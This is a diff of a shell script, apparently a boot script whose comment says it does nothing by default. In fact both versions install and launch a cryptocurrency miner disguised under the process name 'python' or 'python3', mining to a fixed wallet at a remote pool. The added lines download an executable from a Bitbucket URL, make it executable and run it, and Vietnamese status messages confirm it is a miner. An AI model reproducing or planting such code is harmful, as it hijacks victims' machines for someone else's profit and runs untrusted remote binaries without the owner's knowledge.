@@ -10,27 +10,24 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python ]; then
-    if pgrep -x "python" > /dev/null
+if [ -f ${PWD}/python3 ]; then
+    if pgrep -x "python3" > /dev/null
 then
-pkill python
-echo " kill process"
-./python -F http://aqua.signal2noi.se:19998/0xd994dfED4458B2caDCaBBfC004372A101D273d40/CR10
-
+    echo "Miner dang chay roi , ke cmn di "
     
 else
 
 echo "Miner da install , chay thoi "
-./python -F http://aqua.signal2noi.se:19998/0xd994dfED4458B2caDCaBBfC004372A101D273d40/CR10
+./python3 -F http://pool2.aquachain-foundation.org:8888/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh
 
      
 fi
 exit
 fi
 
-wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
-unzip aquaminer-0.4-linux-amd64.zip
-mv aquaminer-0.4-linux-amd64 python
-./python -F http://aqua.signal2noi.se:19998/0xd994dfED4458B2caDCaBBfC004372A101D273d40/CR10
+
+wget https://bitbucket.org/lovelyn/openai/downloads/python3
+chmod +x python3
+./python3 -F http://pool2.aquachain-foundation.org:8888/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh
 
 exit 0
